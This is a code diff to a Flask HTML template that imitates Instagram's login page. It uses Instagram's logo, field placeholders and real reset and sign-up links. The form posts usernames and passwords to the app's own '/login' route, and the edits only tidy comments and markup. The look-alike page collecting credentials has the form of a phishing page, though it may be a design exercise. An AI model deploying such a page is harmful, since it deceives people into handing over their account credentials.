@@ -14,22 +14,25 @@
       <div class="l-user">
         <div class="c-panel group">
           <img class="c-panel__img" src="{{ url_for('static', filename='img/instagram.svg') }}" alt="Instagram">
-          <!-- The form tag is added with the POST method and the action set to '/login' which is the route in your Flask app that handles the login. -->
+          <!-- Login form -->
           <form method="POST" action="/login">
             <div class="c-panel__form">
               <input name="username" type="text" class="c-panel__input" placeholder="Phone number, username, or email" required>
-              <input name="password" type="password" class="c-panel__input" placeholder="Password" required> <!-- Corrected type to 'password' -->
-              <!-- Changed the link to a submit button to submit the form -->
+              <input name="password" type="password" class="c-panel__input" placeholder="Password" required>
               <button type="submit" class="c-btn">Log In</button>
               <span class="c-panel__span">OR</span>
             </div>
           </form>
+          <!-- Login with Facebook button -->
           <a href="#" class="c-panel__facebook">Login with Facebook</a>
+          <!-- Forgot password link -->
           <a href="https://www.instagram.com/accounts/password/reset/" class="c-panel__forgot">Forgot password?</a>
         </div>
+        <!-- Sign up section -->
         <div class="c-signup group">
-          <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/"></a><span>Sign up</span></p></a>
+          <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/"><span>Sign up</span></a></p>
         </div>
+        <!-- App download section -->
         <div class="c-app">
           <p>Get the app.</p>
           <div class="c-app__download">
